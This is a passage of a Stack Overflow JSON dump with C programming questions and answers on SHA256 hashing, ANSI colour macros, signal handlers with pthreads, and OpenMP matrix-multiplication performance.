result;\n}\n</code></pre>\n\n<p>You could also change the API to pass an array of 32 unsigned characters to get the binary form if it is more convenient.</p>\n"}], "owner": {"reputation": 29, "user_id": 2529848, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a407794541a58fdd339629ea9c3140ef?s=128&d=identicon&r=PG", "display_name": "Wesley Romero", "link": "https://stackoverflow.com/users/2529848/wesley-romero"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 159, "favorite_count": 0, "accepted_answer_id": 55033209, "answer_count": 1, "score": 0, "last_activity_date": 1551911451, "creation_date": 1551891300, "last_edit_date": 1551911451, "question_id": 55028350, "link": "https://stackoverflow.com/questions/55028350/hash-value-from-c-function", "title": "Hash value from C function", "body": "<p>I have a problem and hope you can help me.</p>\n\n<p>I have a function written in C that returns hash a value. My \nheadache is when I execute the  program from another tool it takes a lot of time to run, probably because inside my function I run a command that hashes my value in SHA256, so I would like to know if there is another way to do it, maybe a function or something like that.</p>\n\n<p>Here is what I have:</p>\n\n<pre><code>const char *EncryptSHA256 (char *Arg1) {  \n    char command[128];\n    char result[512];\n\n    //I want to replace from here\n    snprintf(command, sizeof command, \"echo -n %s | sha256sum | cut -c1-64\",Arg1);  \n\n    FILE *fpipe;\n\n    if (0 == (fpipe = (FILE*)popen(command, \"r\"))) {\n        perror(\"popen() failed.\");\n        exit(1);\n    }\n\n    fread(result, 1, 512, fpipe);\n\n    pclose(fpipe);\n    const char *sha256 = &amp;result[0];\n    //to here\n\n    return sha256;\n}  \n</code></pre>\n"}, {"tags": ["c", "compiler-errors"], "comments": [{"owner": {"reputation": 69207, "user_id": 1440565, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/ec430cc01ef4cf4ae63ebbe9e8596f72?s=128&d=identicon&r=PG", "display_name": "Code-Apprentice", "link": "https://stackoverflow.com/users/1440565/code-apprentice"}, "edited": false, "score": 0, "creation_date": 1551890326, "post_id": 55028007, "comment_id": 96808684, "body": "One way to debug this is to run only the precompiler and inspect the output."}, {"owner": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 1, "creation_date": 1551890582, "post_id": 55028007, "comment_id": 96808812, "body": "You need to specify the colours as strings too: <code>#define FOREGROUND &quot;38&quot;</code>. Another way is to use stringification operator in the macro."}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 0, "creation_date": 1551890750, "post_id": 55028007, "comment_id": 96808906, "body": "A better way would be not using macros at all but functions."}], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1551890958, "post_id": 55028144, "comment_id": 96809045, "body": "Yes and no on the stringification, because the stringification operator suppresses macro expansion of the argument to which it is applied.  There are workarounds, but the specific alternative definition you present for <code>RGB_COLOR</code> will not work as the OP wants."}], "tags": [], "owner": {"reputation": 469, "user_id": 10984529, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/252d327a280e65cd24f88e1d46be31d7?s=128&d=identicon&r=PG&f=1", "display_name": "dasmy", "link": "https://stackoverflow.com/users/10984529/dasmy"}, "is_accepted": true, "score": 2, "last_activity_date": 1551891879, "last_edit_date": 1551891879, "creation_date": 1551890600, "answer_id": 55028144, "question_id": 55028007, "link": "https://stackoverflow.com/questions/55028007/trying-to-use-a-macro-in-c-to-color-text-but-get-error-expected/55028144#55028144", "title": "Trying to use a macro in C to color text, but get: error: expected &#39;)&#39;", "body": "<p>Looks like you are trying to concatenate strings and integers which is not possible.</p>\n\n<p>As a quick fix, you could try</p>\n\n<pre><code>#define FOREGROUND \"38\"\n#define BACKGROUND \"48\"\n</code></pre>\n\n<p>and use it like</p>\n\n<pre><code>printf( RGB_COLOR(FOREGROUND, \"248\", \"42\", \"148\", \"Starting the server:\\n\") );\n</code></pre>\n\n<p>On the other hand, it should be possible (and cleaner) to <a href=\"https://gcc.gnu.org/onlinedocs/gcc-3.3/cpp/Stringification.html\" rel=\"nofollow noreferrer\">stringize</a> the parameters (untested):</p>\n\n<pre><code>#define xstr(a) str(a)\n#define str(a) #a\n#define RGB_COLOR(plane, r, g, b, string) \"\\033[\" str(plane) \";\" str(r) \";\" str(g) \";\" str(b) \"m\" string ANSI_RESET\n</code></pre>\n\n<p>Note the detour via the <code>xstr</code>and <code>str</code> because stringization prevents macro expansion as @John Bollinger commented correctly.</p>\n"}, {"tags": [], "owner": {"reputation": 13124, "user_id": 1419272, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/dcbff46aa5cd0a98d13d76595b3375f0?s=128&d=identicon&r=PG", "display_name": "alinsoar", "link": "https://stackoverflow.com/users/1419272/alinsoar"}, "is_accepted": false, "score": 0, "last_activity_date": 1551893628, "last_edit_date": 1551893628, "creation_date": 1551893300, "answer_id": 55028945, "question_id": 55028007, "link": "https://stackoverflow.com/questions/55028007/trying-to-use-a-macro-in-c-to-color-text-but-get-error-expected/55028945#55028945", "title": "Trying to use a macro in C to color text, but get: error: expected &#39;)&#39;", "body": "<p>When you concatenate strings you can do it like <code>\"aa\" \"bb\"</code> and the result is like writing <code>\"aabb\"</code>.</p>\n\n<p>So, when you call printf(arguments) it is allowed to write </p>\n\n<pre><code>printf(\"str1\" \"str 2\")\n</code></pre>\n\n<p>but if you want to call printf combining string arguments with numbers you must put comma between arguments</p>\n\n<pre><code>printf(\"aa\" \"bb\", 100)\n</code></pre>\n\n<p>Otherwise the interpreter will consider that you arrived at the last argument -- in cases like</p>\n\n<pre><code>printf(\"aa\" \"bb\" 100)\n</code></pre>\n\n<p>it will consider you should have closed the parenthesis before 100.</p>\n\n<p>In your case you try to call </p>\n\n<p>printf( RGB_COLOR(38, 248, 42, 148, \"Starting the server:\\n\") );</p>\n\n<p>that is rewritten into</p>\n\n<pre><code>printf(  \"\\033[\" \"Starting the server:\\n\"  \";\" 248 ...... )\n</code></pre>\n\n<p>This means</p>\n\n<pre><code>printf(  \"\\033[Starting the server:\\n;\"  248 ...... )\n                                       ^-&gt;HERE EXPECTS COMMA\n</code></pre>\n"}], "owner": {"reputation": 33, "user_id": 7909748, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7be7b8685c5d1705f67fbebee18e5896?s=128&d=identicon&r=PG&f=1", "display_name": "k-piekarczyk", "link": "https://stackoverflow.com/users/7909748/k-piekarczyk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 87, "favorite_count": 0, "accepted_answer_id": 55028144, "answer_count": 2, "score": 0, "last_activity_date": 1551893628, "creation_date": 1551890180, "question_id": 55028007, "link": "https://stackoverflow.com/questions/55028007/trying-to-use-a-macro-in-c-to-color-text-but-get-error-expected", "title": "Trying to use a macro in C to color text, but get: error: expected &#39;)&#39;", "body": "<p>I'm trying to write a macro based terminal string colorer in C for my future projects. So far all I've got is this: </p>\n\n<pre><code>#define ANSI_RED     \"\\x1b[31m\"\n#define ANSI_GREEN   \"\\x1b[32m\"\n#define ANSI_YELLOW  \"\\x1b[33m\"\n#define ANSI_BLUE    \"\\x1b[34m\"\n#define ANSI_MAGENTA \"\\x1b[35m\"\n#define ANSI_CYAN    \"\\x1b[36m\"\n#define ANSI_RESET   \"\\x1b[0m\"\n\n#define ANSI_COLOR(color, string) color string ANSI_RESET\n\n#define FOREGROUND 38\n#define BACKGROUND 48\n\n#define RGB_COLOR(plane, r, g, b, string) \"\\033[\" plane \";\" r \";\" g \";\" b \"m\" string ANSI_RESET\n</code></pre>\n\n<p>The <code>ANSI_COLOR</code> macro works just fine, but when I try to use the <code>RGB_COLOR</code> one like this:</p>\n\n<pre><code>printf( RGB_COLOR(FOREGROUND, 248, 42, 148, \"Starting the server:\\n\") );\n</code></pre>\n\n<p>I get an error:</p>\n\n<pre><code>/c-http-server/main.c:17:23: error: expected ')'\n    printf( RGB_COLOR(FOREGROUND, 248, 42, 148, \"Starting the server:\\n\") );\n                      ^\n/c-http-server/libs/c-chalk/chalk.h:11:20: note: expanded from macro 'FOREGROUND'\n#define FOREGROUND 38\n                   ^\n/c-http-server/main.c:17:11: note: to match this '('\n    printf( RGB_COLOR(FOREGROUND, 248, 42, 148, \"Starting the server:\\n\") );\n</code></pre>\n\n<p>I've looked for this problem on SO, and most of the solutions were about finding the extra ')', but I can't find one in my code.</p>\n\n<p>I'd be thrilled if anyone could help me find the issue, maybe I'm just blind and missed something obvious.</p>\n"}, {"tags": ["c", "linux"], "comments": [{"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 1, "creation_date": 1551890662, "post_id": 55027995, "comment_id": 96808845, "body": "Did you run the code under valgrind?  It should give you some hints."}, {"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 3, "creation_date": 1551891091, "post_id": 55027995, "comment_id": 96809113, "body": "<code>printf()</code> in a signal handler is undefined behavior. You can&#39;t safely make calls to library functions from a signal handler. Per <a href=\"https://port70.net/~nsz/c/c11/n1570.html#note188\" rel=\"nofollow noreferrer\">footnote 188 of the C standard</a>: &quot;Thus, a signal handler cannot, in general, call standard library functions.&quot;  <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/V2_chap02.html#tag_15_04_03\" rel=\"nofollow noreferrer\">POSIX allow the use of async-signal-safe functions</a> which can be called from within a signal handler.  <code>printf()</code> isn&#39;t one of them."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1551891789, "post_id": 55027995, "comment_id": 96809556, "body": "You do not initialize <code>action</code> or set all its members.  Initialization would be easier and cleaner.  Without one of those, you also get undefined behavior at least from the system&#39;s attempt to use <code>action.sa_mask</code>."}, {"owner": {"reputation": 601, "user_id": 9069780, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/49bf2ad1391fadfaac120f3bb4e625ef?s=128&d=identicon&r=PG&f=1", "display_name": "Desperado17", "link": "https://stackoverflow.com/users/9069780/desperado17"}, "edited": false, "score": 0, "creation_date": 1551893173, "post_id": 55027995, "comment_id": 96810478, "body": "Is the initial assumption that the program <i>should</i> continue right? Or do I have to raise a SIGCONT to make it continue?"}], "answers": [{"tags": [], "owner": {"reputation": 729, "user_id": 11060870, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a74dd465c0373f529ebe6f9ee7592add?s=128&d=identicon&r=PG", "display_name": "ccxxshow", "link": "https://stackoverflow.com/users/11060870/ccxxshow"}, "is_accepted": false, "score": 0, "last_activity_date": 1552009769, "last_edit_date": 1552009769, "creation_date": 1551954027, "answer_id": 55041344, "question_id": 55027995, "link": "https://stackoverflow.com/questions/55027995/signal-handler-terminates-program/55041344#55041344", "title": "Signal handler terminates program", "body": "<p>The main problem is that the <code>restore original signal handler</code> is executed too early.</p>\n\n<p>I wrote a SystemTap script to trace <code>do_sigaction</code> and <code>do_signal</code>, as follows:</p>\n\n<pre><code>probe begin {\n    printf(\"start.\\n\");\n}\n\nprobe kernel.function(\"do_signal\") {\n    if (\"test_sigaction\" == execname()) {\n        printf(\"do_signal pid=%d\\n\", pid());\n    }\n}\n\nprobe kernel.function(\"handle_signal\") {\n    if (\"test_sigaction\" == execname()) {\n        printf(\"handle_signal pid=%d\\n\", pid());\n    }\n}\n\nprobe kernel.function(\"do_sigaction\").return {\n    if (\"test_sigaction\" == execname()) {\n        printf(\"do_sigaction: ret=%d sig=%d act=%p oact=%p pid=%d\\n\", \n            $return,  @entry($sig), @entry($act),\n                @entry($oact), pid());\n    }\n}\n</code></pre>\n\n<p>The result is</p>\n\n<pre><code>do_sigaction: ret=0 sig=37 act=0xffffc90006ccbec8 oact=0xffffc90006ccbee8 pid=45920 //STEP1\ndo_sigaction: ret=0 sig=37 act=0xffffc90006ccbec8 oact=0x0 pid=45920 //STEP2\ndo_signal pid=45920 //STEP3\ndo_signal pid=45920\n</code></pre>\n\n<p>The reason:</p>\n\n<ul>\n<li>STEP1: set signal handler to my_signal_handler in main thread</li>\n<li>STEP2: restore original signal handler in main thread</li>\n<li>STEP3: do_signal is executed when the child thread returns from\nkernel mode to user mode.</li>\n</ul>\n\n<p>Obviously there are concurrency issues here.\nIt is possible to restore the signal handler before executing do_signal.\nConcurrent control is required before restore the signal handler, or move restore handler to my_signal_handler function, like as:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;pthread.h&gt;\n#include &lt;signal.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;string.h&gt;\n\nstruct sigaction oldHandler;\nvoid my_signal_handler(int signo, siginfo_t *info, void *extra)\n{\n    printf(\"my signal handler\\n\" );\n    // restore original signal handler\n    sigaction( SIGRTMIN + 3, &amp;oldHandler, NULL );\n}\n\nint threadsupervisor(pthread_t thread_id)\n{\n    struct sigaction action;\n\n    memset(&amp;action, 0, sizeof(action));\n    action.sa_flags = SA_SIGINFO;\n    action.sa_sigaction = my_signal_handler;\n\n    sigaction(SIGRTMIN + 3, &amp;action, &amp;oldHandler );\n\n    // send signal to affected thread\n    pthread_kill(thread_id, SIGRTMIN + 3 );\n    return 0;\n}\n\nvoid *test_thread(void *args)\n{\n    long loop = 0;\n    while(1) {\n        printf(\"sleep %ld\\n\", ++loop);\n        sleep(1);\n    }\n    return (void *)NULL;\n}\n\nint main()\n{\n    pthread_t thread_id;\n    pthread_create(&amp;thread_id, NULL, test_thread, NULL);\n    threadsupervisor(thread_id);\n    pthread_join(thread_id, NULL);\n    return 0;\n}\n</code></pre>\n"}], "owner": {"reputation": 601, "user_id": 9069780, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/49bf2ad1391fadfaac120f3bb4e625ef?s=128&d=identicon&r=PG&f=1", "display_name": "Desperado17", "link": "https://stackoverflow.com/users/9069780/desperado17"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 80, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1552009769, "creation_date": 1551890131, "last_edit_date": 1551890262, "question_id": 55027995, "link": "https://stackoverflow.com/questions/55027995/signal-handler-terminates-program", "title": "Signal handler terminates program", "body": "<p>I try to install a signalhandler using sigaction and then call it on a single thread like this:</p>\n\n<pre><code>void\nmy_signal_handler ( int signo, siginfo_t *info, void *extra )\n{\n   printf(\"my signal handler\\n\" );\n}\n\n\nint threadsupervisor() {\n\n&lt;...&gt;\n\nstruct sigaction action;\nstruct sigaction oldHandler;\n\naction.sa_flags = SA_SIGINFO;\naction.sa_sigaction = my_signal_handler;\n\nsigaction(SIGRTMIN + 3, &amp;action, &amp;oldHandler );\n\n// send signal to affected thread\npthread_kill( threadId, SIGRTMIN + 3 );\n\n// restore original signal handler\nsigaction( SIGRTMIN + 3, &amp;oldHandler, NULL );\n}\n</code></pre>\n\n<p>The thread does receive a SIG37, then the whole application terminates. Shouldn't the program/thread continue after the signal handler is done?</p>\n\n<p>Regards</p>\n"}, {"tags": ["c", "multithreading", "openmp"], "comments": [{"owner": {"reputation": 117929, "user_id": 669586, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/wxf3D.png?s=128&g=1", "display_name": "Sulthan", "link": "https://stackoverflow.com/users/669586/sulthan"}, "edited": false, "score": 0, "creation_date": 1551890194, "post_id": 55027954, "comment_id": 96808612, "body": "Synchronization probably"}, {"owner": {"reputation": 193600, "user_id": 87189, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/98e7d6edce863e7a1bf8199b082eb25e?s=128&d=identicon&r=PG", "display_name": "tadman", "link": "https://stackoverflow.com/users/87189/tadman"}, "edited": false, "score": 1, "creation_date": 1551891361, "post_id": 55027954, "comment_id": 96809294, "body": "There&#39;s diminishing and eventually negative returns for excessive parallelization. Find the sweet spot."}, {"owner": {"reputation": 73919, "user_id": 44309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iL4TW.png?s=128&g=1", "display_name": "High Performance Mark", "link": "https://stackoverflow.com/users/44309/high-performance-mark"}, "edited": false, "score": 0, "creation_date": 1551891601, "post_id": 55027954, "comment_id": 96809434, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/54958186/c-openmp-working-really-slow-on-matrix-vector-product\">C++ OpenMP working really slow on matrix-vector product</a>"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1551892521, "post_id": 55027954, "comment_id": 96810072, "body": "You don&#39;t seem to be distinguishing clearly between threads and cores.  How many (physical) cores does your machine actually provide?  It is unlikely to be helpful to use more threads than you have cores to run them on."}, {"owner": {"reputation": 17, "user_id": 9009654, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6B9VS.jpg?s=128&g=1", "display_name": "Hamidreza Hanifi", "link": "https://stackoverflow.com/users/9009654/hamidreza-hanifi"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1551897472, "post_id": 55027954, "comment_id": 96812628, "body": "my laptop has 4 cores but more than two threads starts to increase the time rather to lowering it @JohnBollinger"}, {"owner": {"reputation": 17, "user_id": 9009654, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6B9VS.jpg?s=128&g=1", "display_name": "Hamidreza Hanifi", "link": "https://stackoverflow.com/users/9009654/hamidreza-hanifi"}, "reply_to_user": {"reputation": 73919, "user_id": 44309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iL4TW.png?s=128&g=1", "display_name": "High Performance Mark", "link": "https://stackoverflow.com/users/44309/high-performance-mark"}, "edited": false, "score": 0, "creation_date": 1551898563, "post_id": 55027954, "comment_id": 96813090, "body": "tried to warm up caches as it says in the topic u mentioned but seems like it&#39;s not the case for me @HighPerformanceMark"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 1, "creation_date": 1551900558, "post_id": 55027954, "comment_id": 96814050, "body": "How are you timing this?"}, {"owner": {"reputation": 73919, "user_id": 44309, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/iL4TW.png?s=128&g=1", "display_name": "High Performance Mark", "link": "https://stackoverflow.com/users/44309/high-performance-mark"}, "edited": false, "score": 1, "creation_date": 1551900672, "post_id": 55027954, "comment_id": 96814117, "body": "And did you experiment with much larger problem sizes ?  Also, don&#39;t expect hyperthreads sharing a single core to magically give the same kind of performance as multiple cores.  Generally, for many HPC workloads such as matrix multiplication, hyperthreads provide no benefit, often a slow down as ou seem to have observed."}], "answers": [{"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": false, "score": 0, "last_activity_date": 1551904468, "creation_date": 1551904468, "answer_id": 55031734, "question_id": 55027954, "link": "https://stackoverflow.com/questions/55027954/increasing-thread-numbers-on-xcode-increases-program-time/55031734#55031734", "title": "increasing thread numbers on xcode increases program time", "body": "<blockquote>\n  <p>any ideas what am i doing wrong or what should i do?!</p>\n</blockquote>\n\n<p>It doesn't look like you're doing anything in particular wrong as far as your code.  Multithreading carries overhead, however, both at the software level and at the hardware level.  As a result, applying more threads to a problem does not always speed the overall computation, and may slow it down.  How that affects a particular task depends on on details of that task and of the host architecture and environment.</p>\n\n<p>Nevertheless, consider this complete test program built around your example code:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n\nint main() {\n    double a[400][400], b[400][400], c[400][400] = { { 0.0 } };\n    int i, j, k, n = 400;\n\n    srand(time(NULL));\n    for (i = 0; i &lt; n; ++i) {\n        for (j = 0; j &lt; n; ++j) {\n            a[i][j] = rand() / (double) RAND_MAX;\n            b[i][j] = rand() / (double) RAND_MAX;\n        }\n    }\n\n    #pragma omp parallel for private(i,j,k) num_threads(4)\n    for (i=0; i&lt;n; ++i) {\n        for (j=0; j&lt;n; ++j) {\n           for (k=0; k&lt;n; ++k) {\n               c[i][j] += a[i][k] * b[k][j];\n           }\n        } \n    }\n\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>I am using a <code>num_threads</code> clause on the <code>parallel for</code> construct instead of calling <code>omp_set_numThreads()</code> to set the requested number of threads, but otherwise the OMP region is identical to yours.  Timing this crudely, via the <code>time</code> command, on my own Linux system, I see that elapsed time goes down with number of threads, exhibiting near-linear speedup, until about four threads.  After that, there's a slight speedup with a fifth thread, and both elapsed time and aggregate CPU time starts increasing at six threads.</p>\n\n<p>Those results likely correlate with the fact that my machine has six physical CPU cores, and the OS and various background processes consume a certain amount of CPU resources all the time.  That your results do not follow the same pattern may be related to the rest of your program, or to your environment, or to your particular OpenMP implementation.  It may even be related to how you're running your time trials.  It's not because the OpenMP region you've presented is flawed.</p>\n"}, {"comments": [{"owner": {"reputation": 17, "user_id": 9009654, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6B9VS.jpg?s=128&g=1", "display_name": "Hamidreza Hanifi", "link": "https://stackoverflow.com/users/9009654/hamidreza-hanifi"}, "edited": false, "score": 0, "creation_date": 1551937267, "post_id": 55034205, "comment_id": 96825353, "body": "sound like this solved my problem thanks. also i used to calculate time using clock_t tStart = clock() function but it seems omp_get_wtime() gives better and more accurate answer any ideas why?"}, {"owner": {"reputation": 370144, "user_id": 1271826, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/duhm9.jpg?s=128&g=1", "display_name": "Rob", "link": "https://stackoverflow.com/users/1271826/rob"}, "edited": false, "score": 0, "creation_date": 1551982544, "post_id": 55034205, "comment_id": 96850634, "body": "Excellent answer. (Minor observation: If you wanted actual matrix products, e.g. to verify the calculations, you\u2019d obviously want to reinitialize c each iteration, but that\u2019s not really material to the performance question.)"}], "tags": [], "owner": {"reputation": 8506, "user_id": 10808674, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/j1tGB.jpg?s=128&g=1", "display_name": "Alain Merigot", "link": "https://stackoverflow.com/users/10808674/alain-merigot"}, "is_accepted": true, "score": 2, "last_activity_date": 1551917883, "creation_date": 1551917883, "answer_id": 55034205, "question_id": 55027954, "link": "https://stackoverflow.com/questions/55027954/increasing-thread-numbers-on-xcode-increases-program-time/55034205#55034205", "title": "increasing thread numbers on xcode increases program time", "body": "<p>You use a <em>bad</em> method to multiply your matrices. The ijk algorithm generates many cache misses. Look at you inner loop. Whenever your index k changes, you go to a new lines of matrix <code>b</code> instead of using a cache friendly traversal along a row. And this large number of cache misses reduces your performances and is nastier for parallel code because of cache coherency algorithms. The ikj algorithm (see code below) is much better. Matrices are all traversed row major and do not generate cache misses.</p>\n\n<p>I tried to experiment with your code.  </p>\n\n<p>To have a steady timing, I time 10 loops of matrix multiplication, and I do that 10 times and I keep the lowest time.</p>\n\n<p>Depending of defines, one can choose either ijk  or ikj and control the parallelism.</p>\n\n<p>Another define select parallel or sequential version. </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;omp.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    double a[400][400], b[400][400], c[400][400] = { { 0.0 } };\n    int i, j, k, n = 400;\n\n    double t1, t2,t;\n\n    srand(100); // better be deterministic when benchmarking\n    for (i = 0; i &lt; n; ++i) {\n        for (j = 0; j &lt; n; ++j) {\n            a[i][j] = rand() / (double) RAND_MAX;\n            b[i][j] = rand() / (double) RAND_MAX;\n        }\n    }\n\n    t=1E100;\n    for(int ll=0;ll&lt;10;ll++){      \n      t1 = omp_get_wtime();\n      for(int mm=0;mm&lt;10;mm++){\n#if THREADS&gt;1\n#pragma omp parallel for private(i,j,k) num_threads(THREADS)\n#endif\n#ifdef ijk\n        for (i=0; i&lt;n; ++i) {\n          for (j=0; j&lt;n; ++j) {\n            for (k=0; k&lt;n; ++k) {\n              c[i][j] += a[i][k] * b[k][j];\n            }\n          } \n        }\n#else // ikj matrix multiplication\n        for (i=0; i&lt;n; ++i) {\n          for (k=0; k&lt;n; ++k) {\n            double r=a[i][k];\n            for (j=0; j&lt;n; ++j) {\n              c[i][j] += r * b[k][j];\n            }\n          } \n        }\n#endif      \n      }\n      t2 = omp_get_wtime();\n      if (t&gt;t2-t1) t=t2-t1;\n    }\n\n    printf(\"%g\\n\",t);\n\n    // to fool these smart optimizers, do something with c\n    FILE* devnull=fopen(\"/dev/null\",\"w\");\n    fprintf(devnull,\"%g\\n\",c[0][0]);\n    return EXIT_SUCCESS;\n}\n</code></pre>\n\n<p>Now the experiments:</p>\n\n<p>First with ijk</p>\n\n<pre><code>am@Mandel$ cc -fopenmp -O3 -march=native -DTHREADS=0 -Dijk omp2.c; ./a.out\n0.196313\nam@Mandel$ cc -fopenmp -O3 -march=native -DTHREADS=4 -Dijk omp2.c; ./a.out\n0.293023\n</code></pre>\n\n<p>And we see that the parallel version is ~50% slower.</p>\n\n<p>Now we switch to ikj</p>\n\n<pre><code>am@Mandel$ cc -fopenmp -O3 -march=native -DTHREADS=0 -Uijk omp2.c; ./a.out\n0.114659\nam@Mandel$ cc -fopenmp -O3 -march=native -DTHREADS=4 -Uijk omp2.c; ./a.out\n0.06113\n</code></pre>\n\n<p>Now the sequential code is ~twice faster and the parallel version is ~twice faster than the sequential one.</p>\n\n<p>Probably with larger matrices you can improve efficiency of parallel code.</p>\n"}, {"comments": [{"owner": {"reputation": 17, "user_id": 9009654, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6B9VS.jpg?s=128&g=1", "display_name": "Hamidreza Hanifi", "link": "https://stackoverflow.com/users/9009654/hamidreza-hanifi"}, "edited": false, "score": 0, "creation_date": 1551965613, "post_id": 55040465, "comment_id": 96840638, "body": "yea as u said i&#39;m trying to educate myself and this is actually a homework for parallel algorithms which i have but thanks for the tip :)"}, {"owner": {"reputation": 1807, "user_id": 1900441, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa3540494c1cb556bf1f517992b172fe?s=128&d=identicon&r=PG", "display_name": "Jim Cownie", "link": "https://stackoverflow.com/users/1900441/jim-cownie"}, "reply_to_user": {"reputation": 17, "user_id": 9009654, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6B9VS.jpg?s=128&g=1", "display_name": "Hamidreza Hanifi", "link": "https://stackoverflow.com/users/9009654/hamidreza-hanifi"}, "edited": false, "score": 0, "creation_date": 1552036454, "post_id": 55040465, "comment_id": 96868265, "body": "Ah, OK, so it&#39;s not your fault. Next time it&#39;d be worth mentioning that up-front..."}], "tags": [], "owner": {"reputation": 1807, "user_id": 1900441, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa3540494c1cb556bf1f517992b172fe?s=128&d=identicon&r=PG", "display_name": "Jim Cownie", "link": "https://stackoverflow.com/users/1900441/jim-cownie"}, "is_accepted": false, "score": 0, "last_activity_date": 1551951460, "creation_date": 1551951460, "answer_id": 55040465, "question_id": 55027954, "link": "https://stackoverflow.com/questions/55027954/increasing-thread-numbers-on-xcode-increases-program-time/55040465#55040465", "title": "increasing thread numbers on xcode increases program time", "body": "<p>Your big mistake is trying to parallelize matrix multiplication. Not because it's impossible, but because it has already been done (along with other important optimizations like cache-blocking and vectorization which you likely won't get around to).</p>\n\n<p>Remember the key phrase: \"The best code is the code I don't have to write\" :-)</p>\n\n<p>So, unless your aim is to educate yourself, stop doing this. Instead find a good BLAS library and spend your time learning how to use it.</p>\n\n<p>(<a href=\"https://software.intel.com/en-us/mkl\" rel=\"nofollow noreferrer\">Intel MKL</a> is good and free to everyone so that's a reasonable choice, but there are many other options which Google can find for you). </p>\n\n<p>Full disclosure: I work for Intel, but not on MKL.</p>\n"}], "owner": {"reputation": 17, "user_id": 9009654, "user_type": "registered", "profile_image": 